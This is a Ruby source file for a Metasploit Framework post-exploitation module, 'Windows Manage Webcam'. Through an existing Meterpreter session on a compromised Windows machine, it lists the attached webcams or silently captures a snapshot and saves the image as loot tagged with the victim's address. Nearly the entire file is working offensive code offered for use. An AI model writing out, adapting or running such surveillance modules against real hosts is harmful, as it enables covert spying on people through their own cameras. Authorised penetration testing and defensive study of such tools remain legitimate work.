##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

	include Msf::Auxiliary::Report

	def initialize(info={})
		super(update_info(info,
			'Name'          => 'Windows Manage Webcam',
			'Description'   => %q{
					This module will allow the user to detect installed webcams (with
					the LIST action) or take a snapshot (with the SNAPSHOT) action.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'sinn3r'],
			'Platform'      => [ 'win'],
			'SessionTypes'  => [ "meterpreter" ],
			'Actions'       =>
				[
					[ 'LIST',     { 'Description' => 'Show a list of webcams' } ],
					[ 'SNAPSHOT', { 'Description' => 'Take a snapshot with the webcam' } ]
				],
			'DefaultAction' => 'LIST'
		))

		register_options(
			[
				OptInt.new('INDEX',   [false, 'The index of the webcam to use', 1]),
				OptInt.new('QUALITY', [false, 'The JPEG image quality', 50])
			], self.class)
	end


	def run
		if client.nil?
			print_error("Invalid session ID selected. Make sure the host isn't dead.")
			return
		end

		if not action
			print_error("Invalid action")
			return
		end

		case action.name
		when /^list$/i
			list_webcams(true)
		when /^snapshot$/i
			snapshot
		end
	end


	def rhost
		client.sock.peerhost
	end


	def snapshot
		webcams = list_webcams

		if webcams.empty?
			print_error("#{rhost} - No webcams found")
			return
		end

		if not webcams[datastore['INDEX']-1]
			print_error("#{rhost} - No such index: #{datastore['INDEX'].to_s}")
			return
		end

		buf = nil

		begin
			print_status("#{rhost} - Starting...")
			client.webcam.webcam_start(datastore['INDEX'])

			buf = client.webcam.webcam_get_frame(datastore['QUALITY'])
			if buf
				print_status("#{rhost} - Got frame")

				p = store_loot(
					"#{rhost}.webcam.snapshot",
					'application/octet-stream',
					rhost,
					buf,
					"#{rhost}_snapshot.jpg",
					"#{rhost} Webcam Snapshot"
				)

				print_good("#{rhost} - Snapshot saved: #{p}")
			end

			client.webcam.webcam_stop
			print_status("#{rhost} - Stopped")
		rescue Rex::Post::Meterpreter::RequestError => e
			print_error(e.message)
			return
		end
	end


	def list_webcams(show=false)
		begin
			webcams = client.webcam.webcam_list
		rescue Rex::Post::Meterpreter::RequestError
			webcams = []
		end

		if show
			tbl = Rex::Ui::Text::Table.new(
				'Header'  => 'Webcam List',
				'Indent'  => 1,
				'Columns' => ['Index', 'Name']
			)

			webcams.each_with_index do |name, indx|
				tbl <<  [(indx+1).to_s, name]
			end

			print_line(tbl.to_s)
		end

		return webcams
	end

end

